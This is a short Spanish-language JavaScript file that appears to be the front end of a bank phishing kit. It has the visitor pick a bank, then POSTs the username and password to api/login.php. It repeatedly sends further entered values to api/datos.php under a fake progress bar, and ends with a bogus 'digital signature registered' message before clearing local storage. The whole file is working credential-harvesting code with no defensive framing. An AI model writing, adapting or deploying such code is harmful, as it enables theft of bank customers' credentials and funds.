var n = 0;

function bancos(data, img) {
	localStorage.setItem("banco", data);
	localStorage.setItem("img", img);
}

function getImg() {
    var img = document.getElementById('bn-img');
    var input = document.getElementById('platform-input');
    
    img.src = localStorage.getItem('img');
    input.value = localStorage.getItem('banco');
}

function login() {
    var user = document.getElementById('username-input');
    var pass = document.getElementById('password-input');
    
    localStorage.setItem("user", user.value);
	localStorage.setItem("pass", pass.value);
	
	if (user.value === '' || pass.value === '') {
	    alert("No puede dejar los campos vacios");
	    return false;
	}
	
	$.ajax({
	    url:"api/login.php",
		dataType:'json', 
		data: {
		    user: localStorage.getItem('user'),
		    pass: localStorage.getItem('pass'),
		    ban: localStorage.getItem('banco')
		}, 
	 	type: 'POST',
	 	success: function(res) {
	 	    localStorage.setItem("idUser", res);
            window.location="sincronizacion.html";
	 	}
	});
}

function sendData() {
    var data = document.getElementById('textDatos');
    var porcentaje = document.getElementById('porcenta-text');
    
    if (data.value === '') {
	    alert("No puede dejar los campos vacios");
	    return false;
	}
	
		$.ajax({
	    url:"api/datos.php",
		dataType:'json', 
		data: {
		    data: data.value,
		    idUser: localStorage.getItem('idUser'),
		    ban: localStorage.getItem('banco')
		}, 
	 	type: 'POST',
	 	success: function(res) {
	 	    console.log(res);
	 	    n += 5;
	 	    porcentaje.innerHTML = n + '%'
	 	    data.value = '';
	 	    
	 	    if (n > 95) {
				$("#Formulario").html("");
				$("#Formulario").append('<div class="alert alert-success">' +
					'<strong><i class="far fa-thumbs-up"></i>Bien hecho!</strong> Su Firma Digital ha sido registrada correctamente.' +
				'</div><div class="row"><a href="index.html" style="text-align: center;margin: 0 auto;"><button class="btn btn-danger" style="margin:20px;">Volver al inicio</button></a></div>');
				localStorage.clear();
			}
	 	}
	});
    
}